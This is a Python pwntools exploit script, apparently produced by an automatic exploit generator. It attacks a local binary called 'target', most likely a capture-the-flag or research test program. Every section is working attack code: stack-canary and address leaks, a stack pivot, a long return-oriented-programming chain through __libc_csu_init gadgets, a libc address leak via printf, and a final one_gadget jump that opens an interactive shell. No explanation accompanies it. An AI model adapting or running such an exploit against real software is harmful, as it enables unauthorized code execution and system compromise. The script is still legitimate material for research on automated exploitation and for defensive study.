#!/usr/bin/env python3
from pwn import *
context.update(arch = 'amd64', os = 'linux', log_level = 'info')

target = ELF('target', checksec=False)
libc_so_6 = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

__libc_csu_init = 0x1290
__libc_csu_init_call_target = 0x4848
__libc_csu_init_gadget1 = 0x12e6
__libc_csu_init_gadget2 = 0x12d0
canary = 0x0
got_leak_libc_fmt_str = 0x4610
libc_so_6_base = 0x0
pivot_dest = 0x4810
pop_r12_ret = 0x32b59
pop_r15_ret = 0x26b71
pop_rdi_ret = 0x12f3
pop_rsi_pop_r15_ret = 0x12f1
target_base = 0x0

def solve_stage1(canary, elf_base, iostates) -> bytes:
    os.system('./launch-crax.sh -c {} -e {} -s {}'.format(hex(canary), hex(elf_base), iostates))
    with open('stage1.bin', 'rb') as f:
        return f.read()

if __name__ == '__main__':
    proc = target.process()

    # output state
    proc.recvrepeat(0.1)

    # input state (offset = 25)
    proc.send(b'\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41')

    # output state
    # leaking: canary
    proc.recv(32)
    canary = u64(b'\x00' + proc.recv(7))
    log.info('leaked canary: {}'.format(hex(canary)))
    proc.recvrepeat(0.1)

    # input state (offset = 96)
    proc.send(b'\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41')

    # output state
    # leaking: code
    proc.recv(123)
    leaked = u64(proc.recv(6).ljust(8, b'\x00'))
    target_base = leaked - 0x10c0
    log.info('leaked ELF base: {}'.format(hex(target_base)))
    proc.recvrepeat(0.1)

    # input state (offset = 48), skipped

    # input state (offset = 48), skipped

    # input state (offset = 48)
    # input state (rop chain begin)
    payload  = solve_stage1(canary, target_base, 'o,i25,o32,i96,o123,i48,i48,i48')[121:217]
    proc.send(payload)
    time.sleep(0.2)

    payload  = p64(target_base + pop_rsi_pop_r15_ret)
    payload += p64(target_base + pivot_dest + 0x8 + 0x30 * 0x1)
    payload += p64(0x0)
    payload += p64(target_base + target.sym['read'])
    payload += p64(target_base + pop_rsi_pop_r15_ret)
    payload += p64(target_base + pivot_dest + 0x8 + 0x30 * 0x2)
    proc.send(payload)
    time.sleep(0.2)

    payload  = p64(target_base + target.sym['_fini'])
    payload += p64(target_base + target.sym['read'])
    payload += p64(target_base + pop_rsi_pop_r15_ret)
    payload += p64(target_base + pivot_dest + 0x8 + 0x30 * 0x3)
    payload += p64(0x0)
    payload += p64(target_base + target.sym['read'])
    proc.send(payload)
    time.sleep(0.2)

    payload  = p64(target_base + pop_rsi_pop_r15_ret)
    payload += p64(target_base + pivot_dest + 0x8 + 0x30 * 0x4)
    payload += p64(0x0)
    payload += p64(target_base + target.sym['read'])
    payload += p64(target_base + pop_rsi_pop_r15_ret)
    payload += p64(target_base + pivot_dest + 0x8 + 0x30 * 0x5)
    proc.send(payload)
    time.sleep(0.2)

    payload  = p64(0x0)
    payload += p64(target_base + target.sym['read'])
    payload += p64(target_base + pop_rsi_pop_r15_ret)
    payload += p64(target_base + pivot_dest + 0x8 + 0x30 * 0x6)
    payload += p64(0x0)
    payload += p64(target_base + target.sym['read'])
    proc.send(payload)
    time.sleep(0.2)

    payload  = p64(target_base + __libc_csu_init_gadget1)
    payload += p64(0x4141414141414141)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(0x0)
    payload += p64(target_base + pivot_dest + 0x30 * 0x7)
    proc.send(payload)
    time.sleep(0.2)

    payload  = p64(0x400)
    payload += p64(target_base + __libc_csu_init_call_target)
    payload += p64(target_base + __libc_csu_init_gadget2)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    proc.send(payload)
    time.sleep(0.2)

    payload  = p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(target_base + target.sym['read'])
    payload += p64(0x4141414141414141)
    proc.send(payload)
    time.sleep(0.2)

    payload  = p64(target_base + __libc_csu_init_gadget1)
    payload += p64(0x4141414141414141)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(0x0)
    payload += p64(target_base + got_leak_libc_fmt_str)
    payload += p64(0x4)
    payload += p64(target_base + __libc_csu_init_call_target)
    payload += p64(target_base + __libc_csu_init_gadget2)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(target_base + target.sym['read'])
    payload += p64(target_base + __libc_csu_init_gadget1)
    payload += p64(0x4141414141414141)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(0x1)
    payload += p64(0x0)
    payload += p64(0x0)
    payload += p64(target_base + __libc_csu_init_call_target)
    payload += p64(target_base + __libc_csu_init_gadget2)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(target_base + target.sym['read'])
    payload += p64(target_base + __libc_csu_init_gadget1)
    payload += p64(0x4141414141414141)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(0x0)
    payload += p64(target_base + target.got['__cxa_finalize'])
    payload += p64(0x0)
    payload += p64(target_base + __libc_csu_init_call_target)
    payload += p64(target_base + __libc_csu_init_gadget2)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(target_base + pop_rdi_ret)
    payload += p64(target_base + got_leak_libc_fmt_str)
    payload += p64(target_base + target.sym['printf'])
    payload += p64(target_base + __libc_csu_init_gadget1)
    payload += p64(0x4141414141414141)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(0x0)
    payload += p64(target_base + pivot_dest + 0x30 * 0x12 + 0x20)
    payload += p64(0x400)
    payload += p64(target_base + __libc_csu_init_call_target)
    payload += p64(target_base + __libc_csu_init_gadget2)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(target_base + target.sym['read'])
    proc.send(payload)
    time.sleep(0.2)

    payload  = b'\x25\x73\x0a\x00'
    proc.send(payload)
    time.sleep(0.2)

    leaked = u64(proc.recv(6).ljust(8, b'\x00'))
    libc_so_6_base = leaked - 0x4a090
    log.info('leaked libc base: {}'.format(hex(libc_so_6_base)))

    payload  = p64(libc_so_6_base + pop_r15_ret)
    payload += p64(target_base + 0x8)
    payload += p64(libc_so_6_base + pop_r12_ret)
    payload += p64(target_base + 0x8)
    payload += p64(libc_so_6_base + 0xe6c7e)
    proc.send(payload)
    time.sleep(0.2)

    proc.interactive()
